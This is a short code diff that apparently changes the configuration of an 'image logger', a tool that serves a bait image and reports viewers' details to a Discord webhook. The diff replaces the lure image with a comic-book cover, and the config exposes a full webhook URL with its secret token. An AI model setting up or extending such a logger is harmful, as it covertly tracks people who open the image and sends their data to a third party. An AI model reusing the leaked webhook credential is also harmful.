@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1567922982901383199/jYS3bplrCtFhbRk79CfDbyEA1KIRElEcRKK6agZO9wlPP7_Tc8FyoXV92PrfvEd4T6BQ",
-    "image": "https://tinyjpg.com/images/social/website.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/21/Web_of_Spider-Man_Vol_1_129-1.png?utm_source=en.wikipedia.org&utm_campaign=index&utm_content=original", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
